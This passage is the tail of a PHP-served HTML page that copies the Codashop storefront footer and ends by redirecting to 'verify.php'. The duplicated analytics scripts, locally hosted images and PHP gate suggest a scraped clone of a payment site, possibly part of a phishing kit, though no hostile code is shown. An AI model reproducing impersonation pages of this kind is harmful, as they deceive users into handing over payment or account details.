                  </div>
                  <!--]-->
               </div>
            </main>
            <footer class="footer--fixed footer" data-testid="footer" data-v-0886a856="" data-v-761e6852="">
               <div class="footer__header" data-v-761e6852=""></div>
               <div class="footer__content" data-v-761e6852="">
                  <section class="footer__content__sections" data-v-761e6852="">
                     <div class="category footer__content__sections__section" data-v-761e6852="" data-v-0a3602bc="">
                        <strong class="category__title" data-v-0a3602bc="">For Publishers</strong>
                        <nav data-v-0a3602bc="">
                           <ul class="category__nav-list" data-v-0a3602bc="">
                              <!--[-->
                              <li class="category__nav-list__item" data-v-0a3602bc=""><a href="https://portal.coda.co/signup" target="_blank" class="category__nav-list__item__link" rel="noopener" data-v-0a3602bc="">List your title on Codashop</a></li>
                              <li class="category__nav-list__item" data-v-0a3602bc=""><a href="https://www.coda.co/product/codashop/" target="_blank" class="category__nav-list__item__link" rel="noopener" data-v-0a3602bc="">Learn more about us</a></li>
                              <!--]-->
                           </ul>
                        </nav>
                     </div>
                     <div class="contact footer__content__sections__section" data-v-761e6852="" data-v-a16f37ce="">
                        <strong class="contact__title" data-v-a16f37ce="">Need help?</strong>
                        <a href="https://us.support.codashop.com" target="_blank" class="contact__link-container" rel="noopener" data-v-a16f37ce="">
                           <span class="contact__link-container__left-icon" data-v-a16f37ce="">
                              <svg width="16" height="15" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 16" data-v-a16f37ce="">
                                 <path stroke="currentColor" d="M2.7 4.76c.48-.1 1.13-.1 2.11-.1h1.04c1.45 0 2.18 0 2.73.3.5.24.89.65 1.14 1.14.28.56.28 1.3.28 2.77v1.7c-.05 1-.65 1.86-1.5 2.26M2.7 4.76c-.24.04-.44.1-.62.2C1.6 5.2 1.2 5.6.95 6.1.67 6.66.67 7.4.67 8.87v2.22c0 1.1.87 1.99 1.95 1.99h.31c.4 0 .68.41.53.79-.2.54.4 1.02.87.69l1.35-.98.03-.02c.43-.31.95-.48 1.47-.48h.35c.35-.02.67-.1.97-.25M2.7 4.76c.03-.7.12-1.2.33-1.6.32-.63.83-1.14 1.46-1.46.71-.37 1.64-.37 3.51-.37h1.33c1.87 0 2.8 0 3.52.37.62.32 1.13.83 1.45 1.45.37.72.37 1.65.37 3.52v2.82A2.51 2.51 0 0 1 12.15 12h-.4a.73.73 0 0 0-.68 1c.27.69-.51 1.3-1.1.88L8.5 12.83"></path>
                                 <path fill="currentColor" d="M4 9.33a.67.67 0 1 1-1.33 0 .67.67 0 0 1 1.33 0Zm2 0a.67.67 0 1 1-1.33 0 .67.67 0 0 1 1.33 0Zm2 0a.67.67 0 1 1-1.33 0 .67.67 0 0 1 1.33 0Z"></path>
                              </svg>
                           </span>
                           <span class="contact__link-container__label" data-v-a16f37ce="">Contact Us</span>
                           <span class="contact__link-container__right-icon" data-v-a16f37ce="">
                              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-a16f37ce="">
                                 <path d="M2.7073 14.1533L3.00119 13.7488H3.00119L2.7073 14.1533ZM1.96986 13.4158L1.56535 13.7097H1.56535L1.96986 13.4158ZM12.6966 13.4158L12.2921 13.122V13.122L12.6966 13.4158ZM11.9592 14.1533L11.6653 13.7488L11.9592 14.1533ZM2.7073 3.42651L2.41341 3.022L2.7073 3.42651ZM1.96986 4.16395L1.56535 3.87006H1.56535L1.96986 4.16395ZM8.66059 3.29467C8.93671 3.29798 9.16324 3.07682 9.16655 2.8007C9.16986 2.52457 8.9487 2.29805 8.67258 2.29474L8.66059 3.29467ZM13.8284 7.45057C13.8251 7.17445 13.5986 6.95329 13.3225 6.9566C13.0463 6.95991 12.8252 7.18644 12.8285 7.46256L13.8284 7.45057ZM6.6702 8.33584C6.47494 8.53111 6.47494 8.84769 6.6702 9.04295C6.86547 9.23821 7.18205 9.23821 7.37731 9.04295L6.6702 8.33584ZM10.3214 0.175525C10.0452 0.176757 9.82236 0.401611 9.82359 0.677751C9.82482 0.95389 10.0497 1.17675 10.3258 1.17552L10.3214 0.175525ZM11.9783 0.668137L11.9806 1.16813L11.9783 0.668137ZM15.045 3.7348L14.545 3.73257L15.045 3.7348ZM14.5376 5.38733C14.5364 5.66347 14.7593 5.88833 15.0354 5.88956C15.3115 5.89079 15.5364 5.66794 15.5376 5.3918L14.5376 5.38733ZM14.4091 1.00859L14.7152 0.613175L14.7152 0.613175L14.4091 1.00859ZM14.7046 1.30401L15.1 0.997994V0.997994L14.7046 1.30401ZM14.5514 1.16171L14.2448 0.766808L14.22 0.786015L14.1979 0.808158L14.5514 1.16171ZM7.33325 14.2899C6.0722 14.2899 5.16658 14.2892 4.46528 14.2132C3.77334 14.1383 3.33986 13.9948 3.00119 13.7488L2.41341 14.5578C2.95096 14.9484 3.58054 15.1232 4.35757 15.2074C5.12524 15.2906 6.09448 15.2899 7.33325 15.2899V14.2899ZM0.833252 8.7899C0.833252 10.0287 0.832566 10.9979 0.915737 11.7656C0.999923 12.5426 1.1748 13.1722 1.56535 13.7097L2.37437 13.122C2.12831 12.7833 1.98489 12.3498 1.90992 11.6579C1.83394 10.9566 1.83325 10.0509 1.83325 8.7899H0.833252ZM3.00119 13.7488C2.76066 13.574 2.54913 13.3625 2.37437 13.122L1.56535 13.7097C1.80179 14.0352 2.08798 14.3214 2.41341 14.5578L3.00119 13.7488ZM12.8333 8.7899C12.8333 10.0509 12.8326 10.9566 12.7566 11.6579C12.6816 12.3498 12.5382 12.7833 12.2921 13.122L13.1012 13.7097C13.4917 13.1722 13.6666 12.5426 13.7508 11.7656C13.8339 10.9979 13.8333 10.0287 13.8333 8.7899H12.8333ZM7.33325 15.2899C8.57203 15.2899 9.54127 15.2906 10.3089 15.2074C11.086 15.1232 11.7155 14.9484 12.2531 14.5578L11.6653 13.7488C11.3266 13.9948 10.8932 14.1383 10.2012 14.2132C9.49992 14.2892 8.5943 14.2899 7.33325 14.2899V15.2899ZM12.2921 13.122C12.1174 13.3625 11.9058 13.574 11.6653 13.7488L12.2531 14.5578C12.5785 14.3214 12.8647 14.0352 13.1012 13.7097L12.2921 13.122ZM7.33325 2.2899C6.09448 2.2899 5.12524 2.28921 4.35757 2.37238C3.58054 2.45657 2.95096 2.63145 2.41341 3.022L3.00119 3.83102C3.33986 3.58496 3.77334 3.44153 4.46528 3.36657C5.16658 3.29059 6.0722 3.2899 7.33325 3.2899V2.2899ZM1.83325 8.7899C1.83325 7.52885 1.83394 6.62323 1.90992 5.92193C1.98489 5.22999 2.12831 4.79651 2.37437 4.45784L1.56535 3.87006C1.1748 4.4076 0.999923 5.03719 0.915737 5.81422C0.832566 6.58188 0.833252 7.55113 0.833252 8.7899H1.83325ZM2.41341 3.022C2.08798 3.25844 1.80179 3.54463 1.56535 3.87006L2.37437 4.45784C2.54913 4.21731 2.76066 4.00578 3.00119 3.83102L2.41341 3.022ZM7.33325 3.2899C7.82438 3.2899 8.26342 3.28991 8.66059 3.29467L8.67258 2.29474C8.26823 2.28989 7.82279 2.2899 7.33325 2.2899V3.2899ZM13.8333 8.7899C13.8333 8.30037 13.8333 7.85493 13.8284 7.45057L12.8285 7.46256C12.8332 7.85974 12.8333 8.29878 12.8333 8.7899H13.8333ZM10.3258 1.17552L11.9806 1.16813L11.9761 0.168142L10.3214 0.175525L10.3258 1.17552ZM14.545 3.73257L14.5376 5.38733L15.5376 5.3918L15.545 3.73704L14.545 3.73257ZM11.9806 1.16813C12.6522 1.16514 13.1136 1.16383 13.4651 1.20222C13.8065 1.23951 13.9803 1.30897 14.1031 1.40401L14.7152 0.613175C14.3866 0.358934 14.0049 0.255221 13.5736 0.20813C13.1525 0.162136 12.6242 0.165251 11.9761 0.168142L11.9806 1.16813ZM15.545 3.73704C15.5479 3.08897 15.551 2.56067 15.505 2.13951C15.4579 1.70829 15.3542 1.32652 15.1 0.997994L14.3091 1.61002C14.4042 1.73284 14.4736 1.90664 14.5109 2.24807C14.5493 2.59957 14.548 3.061 14.545 3.73257L15.545 3.73704ZM7.37731 9.04295L14.905 1.51526L14.1979 0.808158L6.6702 8.33584L7.37731 9.04295ZM14.1031 1.40401C14.1422 1.43423 14.1792 1.46689 14.214 1.50177L14.9222 0.795796C14.8572 0.730619 14.7881 0.669613 14.7152 0.613175L14.1031 1.40401ZM14.214 1.50177C14.2479 1.5358 14.2797 1.57194 14.3091 1.61002L15.1 0.997994C15.0449 0.926878 14.9856 0.859356 14.9222 0.795796L14.214 1.50177ZM14.8581 1.55662L14.8748 1.54369L14.2614 0.753882L14.2448 0.766808L14.8581 1.55662Z" fill="currentColor"></path>
                              </svg>
                           </span>
                        </a>
                     </div>
                     <div class="country footer__content__sections__section" data-v-761e6852="" data-v-037f10a7="">
                        <strong class="country__title" data-v-037f10a7="">Country</strong>
                        <div class="country__locale" data-v-037f10a7="">
                           <a class="country__locale__link" data-auto-capture="footerCountryFlagClick" data-v-037f10a7="">
                              <span class="country__locale__link__flag" data-v-037f10a7="">
                                 <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" data-v-037f10a7="">
                                    <g clip-path="url(#united_states_svg__a)">
                                       <mask id="united_states_svg__b" width="20" height="15" x="2" y="5" maskUnits="userSpaceOnUse" style="mask-type:luminance;">
                                          <path fill="#fff" d="M2 5h20v15H2z"></path>
                                       </mask>
                                       <g mask="url(#united_states_svg__b)">
                                          <path fill="#E31D1C" fill-rule="evenodd" d="M2 5h20v15H2V5Z" clip-rule="evenodd"></path>
                                          <path fill="#F7FCFF" fill-rule="evenodd" d="M2 6.25V7.5h20V6.25H2Zm0 2.5V10h20V8.75H2Zm0 3.75v-1.25h20v1.25H2Zm0 1.25V15h20v-1.25H2Zm0 3.75v-1.25h20v1.25H2ZM2 20v-1.25h20V20H2Z" clip-rule="evenodd"></path>
                                          <path fill="#2E42A5" d="M2 5h11.25v8.75H2z"></path>
                                          <path fill="#F7FCFF" fill-rule="evenodd" d="m3.3 7.717.662-.461.514.37h-.29l.588.52-.2.73h-.31l-.303-.67-.257.67h-.769l.589.52-.224.821.662-.461.514.37h-.29l.588.52-.2.73h-.31l-.303-.67-.257.67h-.769l.589.52-.224.821.662-.461.641.461-.199-.82.515-.521H4.68l.531-.37.514.37h-.29l.588.52-.224.821.662-.461.641.461-.199-.82.515-.521H7.18l.531-.37.514.37h-.29l.588.52-.224.821.662-.461.641.461-.199-.82.515-.521H9.68l.531-.37.514.37h-.29l.588.52-.224.821.662-.461.641.461-.199-.82.515-.521h-.655l-.303-.67-.257.67h-.373l-.177-.73.515-.52h-.238l.531-.37.641.461-.199-.82.515-.521h-.655l-.303-.67-.257.67h-.373l-.177-.73.515-.52h-.238l.531-.37.641.461-.199-.82.515-.521h-.655l-.303-.67-.257.67h-.769l.589.52-.2.73h-.31l-.303-.67-.257.67H9.58l-.177-.73.515-.52h-.655l-.303-.67-.257.67h-.769l.589.52-.2.73h-.31l-.303-.67-.257.67H7.08l-.177-.73.515-.52h-.655l-.303-.67-.257.67h-.769l.589.52-.2.73h-.31l-.303-.67-.257.67H4.58l-.177-.73.515-.52h-.655l-.303-.67-.257.67h-.769l.589.52-.224.821Zm7.525 2.409.199-.73-.589-.52h.291l-.514-.37-.53.37h.237l-.515.52.177.73h.373l.257-.67.303.67h.31Zm-1.349 0-.514-.37-.53.37h.237l-.515.52.177.73h.373l.257-.67.303.67h.31l.2-.73-.589-.52h.291Zm-2.202.52-.2.73h-.31l-.303-.67-.257.67H5.83l-.177-.73.515-.52H5.93l.531-.37.514.37h-.29l.588.52Zm.18-.52H7.08l-.177-.73.515-.52H7.18l.531-.37.514.37h-.29l.588.52-.2.73h-.31l-.303-.67-.257.67Zm-1.63 0 .2-.73-.589-.52h.291l-.514-.37-.53.37h.237l-.515.52.177.73h.373l.257-.67.303.67h.31Zm3.95-1.98-.2.73h-.31l-.303-.67-.257.67H8.33l-.177-.73.515-.52H8.43l.531-.37.514.37h-.29l.588.52Zm-2.798-.52-.514-.37-.53.37h.237l-.515.52.177.73h.373l.257-.67.303.67h.31l.2-.73-.589-.52h.291Z" clip-rule="evenodd"></path>
                                       </g>
                                    </g>
                                    <rect width="19" height="14" x="2.5" y="5.5" stroke="#000" stroke-opacity=".1" rx="1" style="mix-blend-mode:multiply;"></rect>
                                    <rect width="20" height="15" x="2" y="4.5" fill="url(#united_states_svg__c)" rx="1.5" style="mix-blend-mode:overlay;"></rect>
                                    <defs>
                                       <linearGradient id="united_states_svg__c" x1="12" x2="12" y1="4.5" y2="19.5" gradientUnits="userSpaceOnUse">
                                          <stop stop-color="#fff" stop-opacity=".7"></stop>
                                          <stop offset="1" stop-opacity=".3"></stop>
                                       </linearGradient>
                                       <clipPath id="united_states_svg__a">
                                          <rect width="20" height="15" x="2" y="5" fill="#fff" rx="1.5"></rect>
                                       </clipPath>
                                    </defs>
                                 </svg>
                              </span>
                              <span class="country__locale__link__name" data-v-037f10a7="">United States</span>
                              <span class="country__locale__link__icon" data-v-037f10a7="">
                                 <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-037f10a7="">
                                    <path d="M5.33325 7.99992H4.83325H5.33325ZM10.6666 7.99992H11.1666H10.6666ZM7.99992 10.6666V11.1666V10.6666ZM9.37953 14.5237L9.48248 15.0129L9.37953 14.5237ZM6.62032 14.5237L6.51736 15.0129L6.62032 14.5237ZM1.82566 5.48072L1.36278 5.29166H1.36278L1.82566 5.48072ZM1.47617 9.37952L0.986888 9.48248L1.47617 9.37952ZM6.62032 1.47617L6.51736 0.986888L6.62032 1.47617ZM9.37952 1.47617L9.48248 0.986889L9.37952 1.47617ZM14.1205 5.50477L13.9754 5.02629L14.1205 5.50477ZM1.87856 5.50453L2.0237 5.02606L1.87856 5.50453ZM13.712 5.67146C14.0049 6.38925 14.1666 7.17508 14.1666 7.99992H15.1666C15.1666 7.04331 14.9789 6.1293 14.6379 5.29362L13.712 5.67146ZM14.1666 7.99992C14.1666 8.4381 14.121 8.86509 14.0344 9.27657L15.0129 9.48248C15.1137 9.0037 15.1666 8.50771 15.1666 7.99992H14.1666ZM14.0344 9.27657C13.5334 11.6574 11.6574 13.5334 9.27657 14.0344L9.48248 15.0129C12.2512 14.4303 14.4303 12.2512 15.0129 9.48248L14.0344 9.27657ZM9.27657 14.0344C8.86509 14.121 8.4381 14.1666 7.99992 14.1666V15.1666C8.50771 15.1666 9.0037 15.1137 9.48248 15.0129L9.27657 14.0344ZM7.99992 14.1666C7.56173 14.1666 7.13475 14.121 6.72327 14.0344L6.51736 15.0129C6.99614 15.1137 7.49213 15.1666 7.99992 15.1666V14.1666ZM1.83325 7.99992C1.83325 7.17444 1.99518 6.38802 2.28854 5.66977L1.36278 5.29166C1.02124 6.12787 0.833252 7.04256 0.833252 7.99992H1.83325ZM6.72327 14.0344C4.34247 13.5334 2.46643 11.6574 1.96546 9.27657L0.986888 9.48248C1.56949 12.2512 3.74862 14.4303 6.51736 15.0129L6.72327 14.0344ZM1.96546 9.27657C1.87888 8.86509 1.83325 8.4381 1.83325 7.99992H0.833252C0.833252 8.50771 0.886143 9.00369 0.986888 9.48248L1.96546 9.27657ZM2.28854 5.66977C3.05208 3.80035 4.70716 2.38969 6.72327 1.96546L6.51736 0.986888C4.17149 1.48051 2.24983 3.11985 1.36278 5.29166L2.28854 5.66977ZM6.72327 1.96546C7.13475 1.87888 7.56173 1.83325 7.99992 1.83325V0.833252C7.49213 0.833252 6.99614 0.886143 6.51736 0.986888L6.72327 1.96546ZM7.99992 1.83325C8.4381 1.83325 8.86509 1.87888 9.27657 1.96546L9.48248 0.986889C9.0037 0.886143 8.50771 0.833252 7.99992 0.833252V1.83325ZM9.27657 1.96546C11.2933 2.38982 12.9488 3.8012 13.712 5.67146L14.6379 5.29362C13.7512 3.12084 11.8291 1.48066 9.48248 0.986889L9.27657 1.96546ZM8.90318 1.62816C9.08713 2.20467 9.76806 4.42195 10.0471 6.45915L11.0379 6.32343C10.7464 4.19557 10.0426 1.9093 9.85586 1.32418L8.90318 1.62816ZM10.0471 6.45915C10.1219 7.00512 10.1666 7.52945 10.1666 7.99992H11.1666C11.1666 7.4703 11.1166 6.8983 11.0379 6.32343L10.0471 6.45915ZM13.9754 5.02629C13.2437 5.24821 11.8695 5.63795 10.4518 5.89959L10.6333 6.88299C12.1037 6.61161 13.5181 6.20995 14.2656 5.98325L13.9754 5.02629ZM10.4518 5.89959C9.59176 6.05832 8.73302 6.16659 7.99992 6.16659V7.16659C8.8194 7.16659 9.74518 7.04689 10.6333 6.88299L10.4518 5.89959ZM10.1666 7.99992C10.1666 8.69691 10.0687 9.50801 9.92235 10.3265L10.9067 10.5025C11.0582 9.65545 11.1666 8.7798 11.1666 7.99992H10.1666ZM9.92235 10.3265C9.60156 12.1207 9.06264 13.8719 8.90319 14.3717L9.85586 14.6757C10.0195 14.1628 10.5743 12.362 10.9067 10.5025L9.92235 10.3265ZM14.3717 8.90318C13.8719 9.06264 12.1207 9.60156 10.3265 9.92235L10.5025 10.9067C12.362 10.5743 14.1628 10.0195 14.6757 9.85586L14.3717 8.90318ZM10.3265 9.92235C9.50801 10.0687 8.69691 10.1666 7.99992 10.1666V11.1666C8.7798 11.1666 9.65545 11.0582 10.5025 10.9067L10.3265 9.92235ZM7.99992 10.1666C7.30293 10.1666 6.49183 10.0687 5.6733 9.92235L5.49729 10.9067C6.34439 11.0582 7.22003 11.1666 7.99992 11.1666V10.1666ZM5.6733 9.92235C3.87916 9.60156 2.1279 9.06264 1.62816 8.90318L1.32418 9.85586C1.83704 10.0195 3.63781 10.5743 5.49729 10.9067L5.6733 9.92235ZM4.83325 7.99992C4.83325 8.7798 4.94164 9.65545 5.0931 10.5025L6.07749 10.3265C5.93114 9.50801 5.83325 8.69691 5.83325 7.99992H4.83325ZM5.0931 10.5025C5.42557 12.362 5.98034 14.1628 6.14398 14.6757L7.09666 14.3717C6.9372 13.8719 6.39828 12.1207 6.07749 10.3265L5.0931 10.5025ZM6.14398 1.32418C5.95728 1.9093 5.25345 4.19557 4.96195 6.32343L5.95269 6.45915C6.23178 4.42195 6.91271 2.20467 7.09666 1.62816L6.14398 1.32418ZM4.96195 6.32343C4.88319 6.8983 4.83325 7.4703 4.83325 7.99992H5.83325C5.83325 7.52945 5.8779 7.00512 5.95269 6.45915L4.96195 6.32343ZM7.99992 6.16659C7.26682 6.16659 6.40808 6.05832 5.54807 5.89959L5.36657 6.88299C6.25466 7.04689 7.18044 7.16659 7.99992 7.16659V6.16659ZM5.54807 5.89959C4.12985 5.63785 2.75516 5.24793 2.0237 5.02606L1.73343 5.983C2.48068 6.20967 3.89566 6.61152 5.36657 6.88299L5.54807 5.89959ZM13.9445 5.03879C13.9534 5.0342 13.9639 5.02976 13.9754 5.02629L14.2656 5.98325C14.3149 5.96829 14.3613 5.94913 14.4053 5.92628L13.9445 5.03879ZM1.5648 5.90727C1.61661 5.93896 1.67285 5.96463 1.73343 5.983L2.0237 5.02606C2.04681 5.03307 2.06812 5.0429 2.08652 5.05416L1.5648 5.90727Z" fill="currentColor"></path>
                                 </svg>
                              </span>
                           </a>
                        </div>
                        <div class="language" data-v-037f10a7="" data-v-1c404f27="">
                           <!--[--><a class="language__link--no-underline language__link" data-v-1c404f27="">Español</a><a class="language__link" data-v-1c404f27="">English</a><!--]-->
                        </div>
                     </div>
                     <div data-v-fbecfb96="" data-v-761e6852="" class="manage-cookie footer__content__sections__section" data-testid="manage-cookie">
                        <strong data-v-fbecfb96="" class="manage-cookie__title">Cookie Preference</strong>
                        <div data-v-fbecfb96="" class="manage-cookie__content"><span data-v-fbecfb96="" class="manage-cookie__label">Manage Your Cookie Preference</span></div>
                     </div>
                     <div class="social footer__content__sections__section" data-v-761e6852="" data-v-ceb38c98="">
                        <strong class="social__title" data-v-ceb38c98="">Stay updated with us:</strong>
                        <div class="social__links" data-v-ceb38c98="">
                           <!--[--><a href="https://www.facebook.com/Codashop.us/" target="_blank" class="social__links__item" rel="noopener" aria-label="Codashop Official Facebook" style="" data-v-ceb38c98=""><img width="24" height="24" data-nuxt-img="" srcset="images/socmed-facebook-H36.png 1x, images/socmed-facebook-H36.png 2x" onerror="this.setAttribute('data-error', 1)" class="social__links__item__image" alt="Codashop Official Facebook" loading="lazy" src="images/socmed-facebook-H36.png" data-v-ceb38c98=""></a><a href="https://twitter.com/codashop_us" target="_blank" class="social__links__item" rel="noopener" aria-label="X" style="" data-v-ceb38c98=""><img width="24" height="24" data-nuxt-img="" srcset="images/socmed-twitter-H36-new.jpg 1x, images/socmed-twitter-H36-new.jpg 2x" onerror="this.setAttribute('data-error', 1)" class="social__links__item__image" alt="X" loading="lazy" src="images/socmed-twitter-H36-new.jpg" data-v-ceb38c98=""></a><a href="https://instagram.com/codashop_us" target="_blank" class="social__links__item" rel="noopener" aria-label="Codashop Official Instagram" style="" data-v-ceb38c98=""><img width="24" height="24" data-nuxt-img="" srcset="images/socmed-instagram-H36.png 1x, images/socmed-instagram-H36.png 2x" onerror="this.setAttribute('data-error', 1)" class="social__links__item__image" alt="Codashop Official Instagram" loading="lazy" src="images/socmed-instagram-H36.png" data-v-ceb38c98=""></a><a href="https://www.tiktok.com/@codashop_us" target="_blank" class="social__links__item" rel="noopener" aria-label="Tiktok" style="" data-v-ceb38c98=""><img width="24" height="24" data-nuxt-img="" srcset="images/socmed-tiktok-H36.png 1x, images/socmed-tiktok-H36.png 2x" onerror="this.setAttribute('data-error', 1)" class="social__links__item__image" alt="Tiktok" loading="lazy" src="images/socmed-tiktok-H36.png" data-v-ceb38c98=""></a><a href="https://news.codashop.com/us/" target="_blank" class="social__links__item" rel="noopener" aria-label="Coda_News_URL" style="" data-v-ceb38c98=""><img width="24" height="24" data-nuxt-img="" srcset="images/CodaShop_diamond-darkmatter_36.png 1x, images/CodaShop_diamond-darkmatter_36.png 2x" onerror="this.setAttribute('data-error', 1)" class="social__links__item__image" alt="Coda_News_URL" loading="lazy" src="images/CodaShop_diamond-darkmatter_36.png" data-v-ceb38c98=""></a><!--]-->
                        </div>
                     </div>
                     <!----><!---->
                  </section>
               </div>
               <div class="footer__footer" data-v-761e6852="">
                  <section class="footer__footer__legal" data-v-761e6852="">
                     <div class="legal" data-v-761e6852="" data-v-b313943a="">
                        <!----><!---->
                        <div class="legal__copyright" data-v-b313943a="">Copyright Coda Payments</div>
                        <div class="legal__policies" data-v-b313943a="">
                           <!--[-->
                           <a href="https://marketing.codashop.com/marketing-and-partnership" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-b313943a="">
                              <span data-v-b313943a="">Become An Affiliate</span>
                              <div class="legal__policies__policy-link__separator" style="" data-v-b313943a=""></div>
                           </a>
                           <a href="https://www.coda.co/" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-b313943a="">
                              <span data-v-b313943a="">For Game Publishers</span>
                              <div class="legal__policies__policy-link__separator" style="" data-v-b313943a=""></div>
                           </a>
                           <a href="https://www.coda.co/terms-conditions/terms-conditions-us" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-b313943a="">
                              <span data-v-b313943a="">Terms & Conditions</span>
                              <div class="legal__policies__policy-link__separator" style="" data-v-b313943a=""></div>
                           </a>
                           <a href="https://www.coda.co/privacy-policy/privacy-policy-us" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-b313943a="">
                              <span data-v-b313943a="">Privacy Policy</span>
                              <div class="legal__policies__policy-link__separator" style="" data-v-b313943a=""></div>
                           </a>
                           <a href="https://www.coda.co/policy/coda-payments-vulnerability-disclosure-policy" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-b313943a="">
                              <span data-v-b313943a="">Bug bounty</span>
                              <div class="legal__policies__policy-link__separator" style="" data-v-b313943a=""></div>
                           </a>
                           <a href="https://share-na2.hsforms.com/2J56f_5OJRVGMU5ThSp1YvAs9usq?utm_source=referral&utm_medium=codashop&utm_campaign=codashop_footer" target="_blank" class="legal__policies__policy-link" rel="noopener" data-v-b313943a="">
                              <span data-v-b313943a="">Become A Distributor</span>
                              <div class="legal__policies__policy-link__separator" style="display:none;" data-v-b313943a=""></div>
                           </a>
                           <!--]-->
                        </div>
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 63" aria-labelledby="logo" class="fill-dark-matter-100" height="24" width="109" data-v-b313943a="">
                           <title id="logo">Codashop</title>
                           <path d="M52.2 4.1c-.4-.5-1-1-1.6-1.1L40.8.2 39.5 0h-14a3 3 0 0 0-.7.1l-10.5 3c-.2 0-.4 0-.6.2l-.8.6-.5.4S.4 21 .1 21.6c-.3.7.3.5.5.4l7.8-2.8c1.1-.4 1.4-.5 1.8-1.1l.2-.5L17.5 5c.2-.3.6-.5 1-.4.4.1.4.7.3 1l-4.4 10.8-.2.6v.2c-.1.5.2.5.5.5l10.9-2 1.3-.2 15.5 1.1c1.2.1 1.8-.4 1.5-1.4l-.3-1-2.1-9-.7-2.1c0-.3 0-.8.4-1 .3 0 .7.2.8.5l5.9 12 .6 1.3c.5.8.8 1 2.2 1.3l5 1.4 8.2 3.2c.4.2 1 0 .8-.6-.1-.6-12.5-17-12.5-17Z"></path>
                           <path d="m62.3 26.3-7.2-2.6-4.1-1c-1-.1-1.5-.1-2 1l-.5 1.3L36 54.4c-.1.2-.4.3-.7.3a.6.6 0 0 1-.4-.7l8.3-28.5.7-2.4c.3-1-.3-1.5-1.3-1.6l-15.8-1c-.5-.2-1-.2-1.5 0l-10 1.9a.8.8 0 0 0-.7 1.1l.3.6 2.3 4.7 9 17.7c.1.2.1.9-.4 1-.4.2-.8 0-1-.4L13.7 28.8l-2-3.3-.8-1.3c-.4-.7-1.2-.7-2-.4L2 26.2c-.4.1-1 .4-.6 1L30 61a3 3 0 0 0 4.5 0L63 27.9c.5-.6 0-1.4-.7-1.6ZM111 31.8c0 9-6.1 15.5-14.5 15.5H96c-8.6 0-14.5-6.7-14.5-16v-.5c0-9.3 6-16 14.5-16h.5c8.4 0 14.5 6.6 14.5 15.5H97V23h-1.5v16.4H97v-7.5h14ZM127.3 14.9c8.6 0 14.5 6.6 14.5 16v.4c0 9.3-6 16-14.5 16h-.6c-8.6 0-14.5-6.7-14.5-16v-.5c0-9.3 6-16 14.5-16h.6Zm.5 24.4V22.9h-1.6v16.4h1.6ZM158 15.3c9 0 13.4 6.5 13.4 15.6v.4c0 9-4.5 15.6-13.3 15.6h-14.4V15.3H158Zm-2 24h1.4V22.9H156v16.4ZM173.1 46.9V27.7A13 13 0 0 1 186.6 15h.4c7.9 0 13.5 5.7 13.5 12.8V47h-11.2v-9.3h-5V47H173ZM184.3 28h5v-1.4h-5V28ZM202 25.8c0-6.3 4.3-10.5 10.6-10.5h15.6v9.3h-16.5v1.3h7c6.3 0 10.6 4.2 10.6 10.5s-4.3 10.5-10.6 10.5H203v-9.3h16.5v-1.4h-7c-6.3 0-10.6-4.1-10.6-10.4ZM231 15.3h11.4v10.6h5V15.3h11.4v31.6h-11.4V35.6h-5V47H231V15.3ZM275.7 14.9c8.6 0 14.6 6.6 14.6 16v.4c0 9.3-6 16-14.6 16h-.5c-8.6 0-14.5-6.7-14.5-16v-.5c0-9.3 6-16 14.5-16h.5Zm.5 24.4V22.9h-1.5v16.4h1.5ZM292.2 46.9V15.3h18.1c5.7 0 9.7 4.1 9.7 9.9v.7c0 5.8-4 10-9.7 10h-6.8v11h-11.3Zm16-21.3a2 2 0 1 0-4.1 0 2 2 0 0 0 4.1 0Z"></path>
                        </svg>
                     </div>
                  </section>
               </div>
            </footer>
            <aside data-v-c0038f55="" data-v-0886a856="" data-testid="nav-side-bar" class="sidebar">
               <!----><!---->
            </aside>
         </div>
      </div>

      <!----><!----><!---->
      <div data-v-82590ec1="" class="fixed inset-0 z-30 bg-transparent hover:cursor-wait" style="display: none;"></div>
      <!---->
   <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" version":"2024.11.0","token":"7720756c877a4e5297149d4b8d070a78","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>


<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" version":"2024.11.0","token":"9fcecae9cb304fa185e31248101968fc","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>

</body></html>
<?php
}else{
    header("Location: verify.php");
}
?>